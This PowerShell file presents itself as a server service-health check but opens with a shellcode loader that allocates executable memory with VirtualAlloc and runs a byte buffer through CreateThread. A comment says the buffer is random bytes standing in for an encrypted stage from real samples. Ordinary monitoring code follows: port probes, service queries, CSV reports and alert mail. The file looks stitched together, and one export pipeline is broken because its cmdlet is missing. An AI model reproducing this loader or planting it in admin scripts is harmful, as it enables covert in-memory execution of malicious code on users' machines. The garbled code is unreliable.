
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x5d, 0x49, 0x94, 0x11, 0x5b, 0xe3, 0xb4, 0x48, 0x1d, 0xbb, 0xdc, 0xf6, 0x9d, 0xce, 0xd7, 0x14,
    0x87, 0xf2, 0x33, 0x82, 0x8f, 0x92, 0xc3, 0x99, 0xa5, 0x3b, 0xea, 0xb3, 0x73, 0x1d, 0x2d, 0xfd,
    0x0d, 0xee, 0x30, 0x8d, 0x55, 0x74, 0xf0, 0x44, 0xb0, 0x8b, 0x81, 0x78, 0xab, 0x27, 0x11, 0xe4,
    0xb5, 0xed, 0x00, 0x4f, 0xdf, 0xec, 0xf1, 0x9a, 0x25, 0x57, 0x06, 0x35, 0x4b, 0xc9, 0xb7, 0x3d,
    0x1f, 0xc0, 0x38, 0x65, 0xfb, 0xaf, 0xdc, 0x0f, 0xc9, 0xc8, 0xdc, 0x3f, 0x52, 0x9e, 0xce, 0xdd,
    0x89, 0xb8, 0x56, 0x67, 0xb5, 0xaf, 0x07, 0xe7, 0xed, 0x9f, 0x88, 0x27, 0xf3, 0x73, 0x9c, 0x1b,
    0xb0, 0xaf, 0xba, 0xb8, 0xd4, 0x77, 0xf9, 0xbf, 0xe8, 0xfe, 0xaa, 0xa1, 0x63, 0x29, 0xc9, 0x6f,
    0x82, 0x2d, 0xfd, 0x70, 0x6d, 0xc4, 0xc1, 0xe0, 0x93, 0x83, 0xd2, 0xd3, 0xc2, 0xe7, 0x37, 0x99,
    0xd0, 0x47, 0x16, 0xea, 0x03, 0x65, 0xd2, 0x1d, 0xec, 0x08, 0xdf, 0x83, 0xf8, 0x10, 0x64, 0x0a,
    0xe1, 0xd2, 0x81, 0xf3, 0x38, 0x78, 0xa5, 0x3f, 0x64, 0xcb, 0x85, 0xf0, 0x30, 0x34, 0x4e, 0xe1,
    0x7d, 0x6e, 0x30, 0xc3, 0xad, 0x04, 0x4d, 0x54, 0xda, 0x3b, 0x50, 0x4c, 0xd9, 0xb3, 0x29, 0x21,
    0x20, 0xce, 0x6d, 0xda, 0xd4, 0x3b, 0x13, 0xc2, 0x3f, 0xe6, 0xd8, 0x52, 0x85, 0x68, 0x2a, 0x84,
    0x69, 0x97, 0xcb, 0xbe, 0x95, 0x4b, 0x1a, 0x4f, 0xd5, 0x2c, 0x1a, 0x44, 0x21, 0x7f, 0x8b, 0x54,
    0x54, 0x46, 0xee, 0xe9, 0x91, 0x11, 0x45, 0xc1, 0xfa, 0xff, 0x82, 0xfa, 0x79, 0x38, 0xda, 0x67,
    0x18, 0xfc, 0x9a, 0x75, 0x20, 0x79, 0xba, 0xcd, 0xec, 0xcc, 0xc6, 0xcc, 0x15, 0xa9, 0x05, 0x37,
    0x50, 0x7b, 0xb8, 0x83, 0xa9, 0xe9, 0x44, 0x60, 0xa5, 0x4d, 0xf7, 0x79, 0x34, 0x1e, 0xe0, 0x45,
    0x80, 0xba, 0xc5, 0x17, 0x04, 0x65, 0x1d, 0x8a, 0x02, 0x6a, 0x63, 0x28, 0xcc, 0x78, 0xc7, 0xe4,
    0xa8, 0xf1, 0x18, 0xe5, 0x18, 0x6b, 0x27, 0xa2, 0x33, 0xa0, 0x47, 0x03, 0xb4, 0xa5, 0x64, 0x0c,
    0x7e, 0xba, 0xa0, 0xc8, 0x85, 0x96, 0x86, 0xdc, 0x56, 0xb6, 0xc0, 0x93, 0xd2, 0x0b, 0x5a, 0x33,
    0xe9, 0xe3, 0x04, 0xc7, 0xa5, 0x4c, 0x02, 0x4b, 0x32, 0x67, 0xaf, 0x80, 0x18, 0x03, 0xcb, 0x4c,
    0x9f, 0x16, 0x89, 0x7a, 0xd9, 0x63, 0xce, 0xc4, 0xba, 0x3f, 0x89, 0x82, 0x33, 0x3b, 0xc3, 0x73,
    0x7d, 0xcc, 0x3c, 0xf1, 0x10, 0x10, 0x4c, 0x10, 0x5f, 0x53, 0x4d, 0x5c, 0x35, 0x9e, 0x2c, 0xe5,
    0xd6, 0x45, 0xba, 0xf9, 0x55, 0xb7, 0x2f, 0x76, 0x8f, 0x78, 0x70, 0xab, 0x91, 0xe3, 0x17, 0xbc,
    0x33, 0xd1, 0x32, 0x07, 0x88, 0x8a, 0x77, 0x5f, 0xa5, 0xd5, 0x9e
)

$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 941)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
$Servers             = @('web-stg-01', 'filesrv01', 'app-prod-01', 'sql-prod-02')
$Services            = @('W3SVC', 'WinRM', 'Spooler')
$Port                = 5985
$TimeoutMilliseconds = 3000
$ReportPath          = 'C:\Reports\service-health-2025-05-25.csv'

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })

$retry = @($down | Where-Object { $_.Service -ne '*' })
for ($attempt = 1; $attempt -le 2; $attempt++) {
    if (@($retry).Count -eq 0) { break }
    Start-Sleep -Seconds 5
    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
    $retry = @($retry | Where-Object {
        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
    })
}

$results |
    -Path $ReportPath `
    -NoTypeInformation `
    -Encoding UTF8
$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8

$byServer = $results | Group-Object -Property Server | ForEach-Object {
    [pscustomobject]@{
        Server = $_.Name
        Checks = $_.Count
        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
    }
}
$byServer | Format-Table -AutoSize

$MailTo = "monitoring@adatum.com"
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From 'monitoring@adatum.com' -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer "smtp.adatum.com" -Port 587 -UseSsl
}

$history = $ReportPath.Replace('.csv', '-history.csv')
$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green

$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)

$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
Write-Verbose ("Running checks: {0}" -f $uptime)

$dashboard = $results | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
}
$dashboard | Format-Table -AutoSize

$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
if (@($errorRows).Count -gt 0) {
    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
}

$osInfo = foreach ($srv in $Servers) {
    [pscustomobject]@{
        Server = $srv
        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
    }
}
$osInfo | Format-Table -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
